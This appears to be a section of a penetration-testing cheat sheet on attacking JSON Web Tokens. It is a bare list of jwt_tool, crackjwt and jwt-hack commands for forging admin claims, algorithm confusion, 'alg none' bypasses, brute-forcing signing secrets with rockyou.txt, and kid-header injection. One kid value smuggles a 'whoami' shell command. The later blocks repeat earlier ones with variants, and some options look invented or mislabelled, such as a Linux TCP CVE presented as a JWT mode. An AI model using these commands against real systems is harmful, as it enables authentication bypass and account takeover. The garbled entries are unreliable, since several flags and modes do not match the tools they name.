### 5.1 JWT Testing
    # Tamper alg, change payload claim
    jwt_tool eyJhbGci... --exploit -X a -pc name -pv admin
    
    # kid header injection for command execution
    jwt_tool eyJhbGci... --exploit -I -hc kid -hv "/dev/null;whoami"
    
    # Sign with new key (e.g. after alg confusion)
    jwt_tool eyJhbGci... -S hs256 -k "public_key.pem"
    
    # Verify with public key
    jwt_tool eyJhbGci... -V -pk public_key.pem
    
    # Add new 'password' claim
    jwt_tool eyJhbGci... -A -p password
    
    # Decode only
    jwt_tool eyJhbGci... -d

    
    # Brute force HS256 secret
    crackjwt -t eyJhbGci... -w rockyou.txt -a HS256
    
    # Test for weak public key in RS256 (e.g. if it's actually the private key)
    crackjwt -t eyJabc... -w wordlist.txt -a RS256 --pubkey public.pem
    -------
    jwt_tool eyJhbGci...
    jwt_tool eyJhbGci... --exploit -X a -pc name -pv admin
    crackjwt -t eyJhbGci... -w rockyou.txt
    crackjwt -t eyJhbGci... -w wordlist.txt -a HS256
    jwt-hack -t token.jwt -m all -o results.txt
    ------
    jwt_tool eyJhbGci... --exploit -X k -kc "" -pc admin -pv true
    jwt_tool eyJhbGci... --exploit -X n -i
    jwt_tool eyJhbGci... --exploit -X s -hs none
    crackjwt -t eyJhbGci... -w /usr/share/wordlists/rockyou.txt -a HS256,RS256 -v
    crackjwt -t eyJhbGci... -k $(cat private.key) -a RS256 -m verify
    jwt-hack -t token.jwt -m all -o results_full.txt -d /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt
    jwt-hack -t token.jwt -m alg none -s ""
    jwt-hack -t token.jwt -m kid inject -p '{"kid": "../../evil.jwk"}'
    ------
    jwt_tool eyJhbGci... --exploit -X k -kc " " -pc admin -pv " "
    jwt_tool eyJhbGci... --exploit -X n -i -is none
    jwt_tool eyJhbGci... --exploit -X s -hs HS256 -k ""
    crackjwt -t eyJhbGci... -w /usr/share/wordlists/rockyou.txt -a HS256,RS256,ES256 -v -j 8
    crackjwt -t eyJhbGci... -k $(cat public.key) -a RS256 -m verify -p
    jwt-hack -t token.jwt -m all -o results_very_full.txt -d /usr/share/seclists/Passwords/Common-Credentials/probable-v2-top15.txt -delay 1
    jwt-hack -t token.jwt -m cve-2019-11477 -s '{"alg":"none"}'
    jwt-hack -t token.jwt -m jwk -j $(cat evil.jwk)